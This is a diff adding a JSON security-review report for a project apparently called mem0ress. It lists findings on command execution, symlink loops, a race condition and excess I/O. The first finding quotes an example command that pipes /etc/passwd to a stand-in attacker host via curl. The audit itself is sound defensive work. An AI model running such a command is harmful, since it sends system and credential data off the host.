@@ -1,0 +1,89 @@
+{
+  "reviewer": "adversarial",
+  "findings": [
+    {
+      "title": "HarnessRunner._verify_tier2() executes shell commands from task requirements",
+      "description": "The `shell:` prefix in requirements allows arbitrary command execution via subprocess.run(shell=True). An agent or user who writes a requirement like `shell:curl http://evil.com/?data=$(cat /etc/passwd)` will have that command executed with the privileges of the mem0ress process.",
+      "severity": "high",
+      "file": "src/mem0ress/harness/__init__.py",
+      "line": 130,
+      "confidence": 0.85,
+      "autofix_class": "advisory",
+      "owner": "human",
+      "requires_verification": false,
+      "pre_existing": false,
+      "why_it_matters": "The shell=True flag combined with user/agent-defined requirements creates a command injection vector. While this is BY DESIGN per the spec (requirements are agent-defined), it means any compromise of task data or any malicious agent can execute arbitrary shell commands on the host system.",
+      "evidence": [
+        "HarnessRunner._verify_tier2() at line 130: subprocess.run(cmd, shell=True, ...) executes commands derived from manifest.cognitive_triad.requirements",
+        "Requirements are stored in task.md and parsed from YAML - any agent can write shell: prefixed requirements",
+        "The 30-second timeout does not prevent damage from commands that are already executing"
+      ],
+      "suggested_fix": "Document this as an intentional security trade-off. In environments where task requirements are untrusted, use a sandboxed execution environment (containers, seccomp, or a dedicated verification service) rather than shell=True."
+    },
+    {
+      "title": "find_git_repos() can infinite loop on circular symlinks",
+      "description": "The BFS traversal in find_git_repos() has no symlink detection or cycle prevention. If a directory contains a symlink that points to an ancestor directory, the scan will loop forever.",
+      "severity": "medium",
+      "file": "src/mem0ress/substrate/git_ops.py",
+      "line": 206,
+      "confidence": 0.75,
+      "autofix_class": "safe_auto",
+      "owner": "downstream-resolver",
+      "requires_verification": true,
+      "pre_existing": false,
+      "why_it_matters": "A user who creates a circular symlink (e.g., ln -s .. task_dir/link) will cause get_data_plane() to hang indefinitely, creating a denial of service condition.",
+      "evidence": [
+        "Line 206: dirs_to_scan.append(child) - no check for symlink or visited paths",
+        "No visited set is maintained to detect cycles",
+        "child.is_dir() returns True for symlink targets that are directories, so the symlink chain is followed without detection"
+      ],
+      "suggested_fix": "Add a visited set: `visited = {root}` and check `if child.resolve() not in visited` before appending. Use `child.is_symlink()` or `child.resolve()` to detect cycles."
+    },
+    {
+      "title": "create_task() has TOCTOU race between existence check and directory creation",
+      "description": "Two processes running create_task() for the same task_id simultaneously can both pass the index_path.exists() check before either creates the directory. This breaks the TaskExistsError guarantee.",
+      "severity": "medium",
+      "file": "src/mem0ress/gateway/actions.py",
+      "line": 43,
+      "confidence": 0.70,
+      "autofix_class": "safe_auto",
+      "owner": "downstream-resolver",
+      "requires_verification": true,
+      "pre_existing": false,
+      "why_it_matters": "In concurrent environments, two processes can simultaneously attempt to create the same task. Both pass the exists() check, both call mkdir(), and potentially both write to the same directory, causing data corruption.",
+      "evidence": [
+        "Line 43: if index_path.exists() raises TaskExistsError - but this is a check separate from the mkdir on line 47",
+        "Line 47: task_dir.mkdir(parents=True, exist_ok=True) - mkdir is atomic, but the existence check is not atomic with respect to the create",
+        "Between lines 43 and 47, another process could create the same directory"
+      ],
+      "suggested_fix": "Either catch the FileExistsError from mkdir() as the primary guard, or use filesystem-based locking (flock or O_EXCL) around the check-then-create sequence."
+    },
+    {
+      "title": "CognitiveContext.__exit__ auto-snapshot runs for ALL tasks regardless of activity",
+      "description": "On every turn exit, _append_session_snapshot() iterates over ALL entries in the status plane and calls snapshot_session for each. With many tasks, this causes unbounded I/O on every turn.",
+      "severity": "low",
+      "file": "src/mem0ress/gateway/intercept.py",
+      "line": 228,
+      "confidence": 0.65,
+      "autofix_class": "manual",
+      "owner": "downstream-resolver",
+      "requires_verification": false,
+      "pre_existing": false,
+      "why_it_matters": "Every turn exit triggers writes to session.md for ALL tasks, not just the ones that were active during the turn. With 100 tasks, every turn generates 100 file writes even if only 1 task was worked on.",
+      "evidence": [
+        "Line 228-235: for entry in self._status_plane.entries: snapshot_session(...) - no filtering by which tasks were actually touched this turn",
+        "No batching or deduplication - same task can receive multiple snapshots per turn if __exit__ is called multiple times"
+      ],
+      "suggested_fix": "Track which tasks were actually modified during the turn (via a set populated by write operations) and only snapshot those tasks. Or make the auto-snapshot behavior configurable via a flag."
+    }
+  ],
+  "residual_risks": [
+    "The shell=True in _verify_tier2 is a deliberate design decision per spec.md. It cannot be made safe without removing the feature entirely.",
+    "The get_dirty_files() parsing using line[2:] works correctly for standard porcelain output but could misparse edge cases like renamed files with spaces in paths."
+  ],
+  "testing_gaps": [
+    "No tests for circular symlink detection in find_git_repos()",
+    "No concurrent create_task tests to verify TaskExistsError behavior under race conditions",
+    "No tests for the auto-snapshot behavior in CognitiveContext with many tasks"
+  ]
+}
